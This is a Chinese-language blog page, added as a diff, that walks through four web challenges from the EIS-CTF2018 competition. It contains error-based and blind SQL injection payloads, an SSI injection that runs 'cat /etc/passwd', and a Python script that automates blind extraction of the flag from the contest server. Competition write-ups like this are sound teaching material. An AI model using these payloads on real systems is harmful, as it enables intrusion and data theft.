@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>EIS-CTF2018 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="simpleBBS题目：http://bbs.sec.zju.edu.cn/ 进入网站 注册 登录  题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，   那是不可能的，一翻py，fuzz，注册的时候会报错，说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。不过给我最大的启发是">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EIS-CTF2018">
+<meta property="og:url" content="http://yoursite.com/2018/11/16/2018 高校网络信息安全管理运维挑战赛/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="simpleBBS题目：http://bbs.sec.zju.edu.cn/ 进入网站 注册 登录  题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，   那是不可能的，一翻py，fuzz，注册的时候会报错，说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。不过给我最大的启发是">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/1dNLEfQayFdnJqhH4rN6kWsulozQzAJIWsmrASqSK6g!/b/dD4BAAAAAAAA&bo=1wUUAwAAAAADB.c!&rf=viewer_4">
+<meta property="og:image" content="https://i.imgur.com/7VAUrdK.png">
+<meta property="og:image" content="https://i.imgur.com/I1cK3FY.png">
+<meta property="og:image" content="https://i.imgur.com/q4WWKMq.png">
+<meta property="og:image" content="https://i.imgur.com/AbgQOg0.png">
+<meta property="og:image" content="https://i.imgur.com/nmCN9P7.png">
+<meta property="og:image" content="https://i.imgur.com/QWDo2b3.png">
+<meta property="og:image" content="https://i.imgur.com/FHewbsx.png">
+<meta property="og:image" content="https://i.imgur.com/1OvWuoO.png">
+<meta property="og:image" content="https://i.imgur.com/dWsKl24.png">
+<meta property="og:image" content="https://i.imgur.com/IdxrzN8.png">
+<meta property="og:image" content="https://i.imgur.com/OOd1kvu.png">
+<meta property="og:image" content="https://i.imgur.com/QoxxXp2.png">
+<meta property="og:image" content="https://i.imgur.com/DD3Nya2.png">
+<meta property="og:image" content="https://i.imgur.com/VbFQcqd.png">
+<meta property="og:updated_time" content="2018-11-20T03:14:20.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="EIS-CTF2018">
+<meta name="twitter:description" content="simpleBBS题目：http://bbs.sec.zju.edu.cn/ 进入网站 注册 登录  题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，   那是不可能的，一翻py，fuzz，注册的时候会报错，说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。不过给我最大的启发是">
+<meta name="twitter:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/1dNLEfQayFdnJqhH4rN6kWsulozQzAJIWsmrASqSK6g!/b/dD4BAAAAAAAA&bo=1wUUAwAAAAADB.c!&rf=viewer_4">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-2018 高校网络信息安全管理运维挑战赛" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/16/2018 高校网络信息安全管理运维挑战赛/" class="article-date">
+  <time datetime="2018-11-15T16:00:00.000Z" itemprop="datePublished">2018-11-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      EIS-CTF2018
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="simpleBBS"><a href="#simpleBBS" class="headerlink" title="simpleBBS"></a>simpleBBS</h1><p>题目：<a href="http://bbs.sec.zju.edu.cn/" target="_blank" rel="noopener">http://bbs.sec.zju.edu.cn/</a></p>
+<p>进入网站 注册 登录</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/1dNLEfQayFdnJqhH4rN6kWsulozQzAJIWsmrASqSK6g!/b/dD4BAAAAAAAA&bo=1wUUAwAAAAADB.c!&rf=viewer_4" alt></p>
+<p>题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，  </p>
+<p>那是不可能的，一翻py，fuzz，注册的时候会报错，<br><img src="https://i.imgur.com/7VAUrdK.png" alt><br>说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。<br>不过给我最大的启发是这个页面报错，数据库，难道暗示着 数据库报错，注入？<br>试试 注册页面翻云覆雨的fuzz，好吧单引号过滤了，我注入你个螺旋大锤子。<br>？？不对，我登录页面给个单引号呢，经过一翻测试，必须要已经注册的账号加单引号才有效。<br>好的 测试开始，账号 username=xiaozhupeiqi1’&amp;password123456<br><img src="https://i.imgur.com/I1cK3FY.png" alt><br>这是啥？？数据库报错？好了，二话不说就是报错注入，<br><img src="https://i.imgur.com/q4WWKMq.png" alt><br>flag出来了，hiahiahia，提交，乔德麻袋？？flag咋不全，别担心换个函数<br>username=aaa’ and 1=updatexml(1,concat(0x3a,(select mid(flag,32,32) from flag) ,0x3a),1)–<br>OK了剩下的几位也出来了。此题 完！</p>
+<h1 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h1><p>请看题目，重点 xxe，后面是/flag，就是flag路径，</p>
+<p><img src="https://i.imgur.com/AbgQOg0.png" alt></p>
+<p>开局两个框，抓包!</p>
+<p><img src="https://i.imgur.com/nmCN9P7.png" alt></p>
+<p>我*？不是xml吗，你给我发个json格式包，你想做爪子？<br>不对，这是ctf，这很正常，佩奇老哥给你传个xml格式试试水，</p>
+<p><img src="https://i.imgur.com/QWDo2b3.png" alt></p>
+<p>牛皮，xml 数据可以传输，那么比较容易忽视的点来了，三个箭头的地方原本是json,既然要传输xml，一定要修改成xml，否则你做出来我吃*，<br>然后xxe,不会的请自行参考我的博客xxe，<br>来个payload 包，<br><img src="https://i.imgur.com/FHewbsx.png" alt><br>完结！</p>
+<h1 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h1><p><img src="https://i.imgur.com/1OvWuoO.png" alt></p>
+<p>重点，SSI 是服务器注入，拓展下，ssti是服务器模版注入，名字很像，利用方式有区别，然后flag在当前目录下，</p>
+<p>这道CTF题还是比较简单，但是需要点，点不对打死也做不出来，想复杂的话 更做不出来。</p>
+<p><img src="https://i.imgur.com/dWsKl24.png" alt></p>
+<p>payload </p>
+<pre><code>name=&lt;!--%23exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></pre><p>这里有个小点，如果是#浏览器会自动当成注释，不会解析发包，所以这里给编码%23<br>但是并没卵用，一开始以为会过滤了东西，但是看不出来哪过滤了，这个时候就要多尝试命令，<br>毕竟ssi有那么多命令<br>尝试过后使用 </p>
+<pre><code>name=&lt;!--%23include virtual=&quot;flag&quot;--&gt;</code></pre><p><img src="https://i.imgur.com/IdxrzN8.png" alt></p>
+<h1 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h1><p>题目，简单的blog,然后在classes给提示说是二次注入，一翻尝试之后无果，最后大佬给的思路，注意主页的提示<br>注意0分，final exam提交答卷会随机给一个成绩，既然说二次注入，会不会是看成绩的时候会把用户名啥的代入到数据库中，因为提交答卷分数插入到数据库，这里可能造成二次注入，即然这样那注入点就在用户名上面了，不断注册查看是否等于0，后来看wp晓得，当成绩为0时说明逻辑错误，不为0则逻辑正常。</p>
+<p><img src="https://i.imgur.com/OOd1kvu.png" alt></p>
+<p>然后注册 账号为 1’ or 1=1 or ‘</p>
+<p>账号这里有几个点着重说一下</p>
+<p>前面的1要单引号闭合，这句逻辑账号有三个语句要判断，第一个1’ 数据库中可能要查询啥不清楚后端代码，这里判断是错的，or 1=1 这个语句是对的， or’ 闭合语句这句也逻辑也是错的，所以我们 or判断只要是对的 那么分数查询那里就会是有分，否则就是0分。</p>
+<p>现在就可写脚本进行检测，首先确定好自己的 注入语句，这里是无法通过回显来注入的，所以我们通过布尔盲注写脚本。</p>
+<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1 or ‘</p>
+<p>查看效果 </p>
+<p><img src="https://i.imgur.com/QoxxXp2.png" alt></p>
+<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1000 or ‘</p>
+<p>这句 肯定为错，因为ascii码不可能大于1000</p>
+<p><img src="https://i.imgur.com/DD3Nya2.png" alt></p>
+<p>可以看到 返回为0说明是错误的，语句已经完成接下来就写个脚本跑出flag。</p>
+<pre><code>import requests
+import re
+
+
+headers = {
+&apos;Connection&apos;: &apos;close&apos;,
+}//防多次访问断开连接
+flag=&quot;&quot;
+for i in range(1,32):
+
+    for nmb in range(32,126):
+
+        payload={&apos;username&apos;:&quot;zpq888&apos; or ascii(substr((select flag from flag limit 0,1),%s,1))=%s or&apos;&quot;%(i,nmb),&apos;password&apos;:&quot;123&quot;}
+        s=requests.Session()
+        url_reg=&apos;http://210.32.4.20/register.php&apos;
+        r=s.post(url_reg,data=payload,headers=headers)
+        url_log=&apos;http://210.32.4.20/login.php&apos;
+        r=s.post(url_log,data=payload,headers=headers)
+        url_ans=&apos;http://210.32.4.20/answer.php&apos;
+        select={&apos;1.a&apos;:&apos;on&apos;}
+        r=s.post(url_ans,data=select,headers=headers)
+        result=r.content[2074:2075]
+        if int(result)!=0:
+            flag=flag+chr(nmb)
+            print flag
+            break</code></pre><p><img src="https://i.imgur.com/VbFQcqd.png" alt></p>
+<p>单线程太慢不跑了！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/16/2018 高校网络信息安全管理运维挑战赛/" data-id="ck0l0oh8t0000py2ifz724kk3" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/11/17/SSI服务器注入/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SSI服务器注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/11/15/条件竞争漏洞/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF中的条件竞争漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
